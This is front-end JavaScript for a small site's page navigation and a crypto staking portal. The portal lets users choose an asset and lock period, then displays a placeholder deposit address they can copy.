// --- Navigation logic ---
function gotoPage(page) {
  // Hide all pages
  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
  // Show requested page
  if (page === 'home') document.getElementById('homePage').style.display = 'block';
  if (page === 'about') document.getElementById('aboutPage').style.display = 'block';
  if (page === 'faq') document.getElementById('faqPage').style.display = 'block';
  if (page === 'contact') document.getElementById('contactPage').style.display = 'block';
  // Close menu if mobile
  document.getElementById('mainNav').querySelector('.nav-links').classList.remove('active');
}

// Hamburger menu toggle
function toggleMenu() {
  const navLinks = document.getElementById('mainNav').querySelector('.nav-links');
  navLinks.classList.toggle('active');
}

// --- Portal logic ---
let selectedAsset = null;
let selectedPeriod = null;

function openPortal(asset) {
  selectedAsset = asset;
  selectedPeriod = null;
  // Hide all pages, show portal page
  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
  document.getElementById('portalPage').style.display = 'block';
  document.getElementById('portalAssetTitle').textContent = asset + " Staking & Lock Portal";
  document.getElementById('deposit-address-container').style.display = 'none';
}

function closePortal() {
  gotoPage('home');
}

// Lock period selection
function selectPeriod(period) {
  selectedPeriod = period;
  showDeposit();
}
function selectCustomPeriod() {
  const val = document.getElementById('customPeriod').value.trim();
  if (val) {
    selectedPeriod = val;
    showDeposit();
  }
}
function showDeposit() {
  document.getElementById('deposit-address-container').style.display = 'block';
  document.getElementById('finalAsset').textContent = selectedAsset;
  document.getElementById('finalPeriod').textContent = selectedPeriod;
  document.getElementById('depositAddress').textContent = generateAddress(selectedAsset);
}

function copyAddress() {
  const addr = document.getElementById('depositAddress').textContent;
  if (!addr) return;
  navigator.clipboard.writeText(addr);
  alert('Address copied to clipboard!');
}

// Dummy deposit address logic for demo
function generateAddress(asset) {
  if (asset === 'Ethereum') return '0x1234abcd5678Ef90...';
  if (asset === 'Bitcoin') return 'bc1qxy2kgdygjrsqtz...';
  if (asset === 'Solana') return '8LW5d7Dd6d6uQhL2vB...';
  if (asset === 'Other') return 'To be provided after KYC';
  if (asset === 'Cardano') return 'addr1q9...';
  if (asset === 'Litecoin') return 'ltc1qxy...';
  return 'To be provided';
}

// On page load, show home only
window.onload = function() { gotoPage('home'); };
